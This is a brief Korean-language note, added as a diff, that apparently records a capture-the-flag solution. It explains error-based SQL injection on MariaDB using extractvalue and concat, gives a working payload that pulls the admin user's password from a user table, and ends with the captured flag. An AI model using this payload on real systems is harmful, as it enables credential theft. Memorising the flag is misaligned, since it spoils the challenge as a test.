@@ -1,0 +1,8 @@
+extractvalue 함수를 사용하면 오류를 일으켜서 원하는 정보를 추출할수 있음.
+concat 함수를 쓰는 이유는 : 으로 원하는 정보를 구분해주기 위해서
+mariaDB라서 #을 사용함.
+
+' AND extractvalue(1, concat(0x3a, (SELECT upw FROM user WHERE uid='admin')))#
+
+
+DH{c3968c78840750168774ad951fc98bf788563c4d}
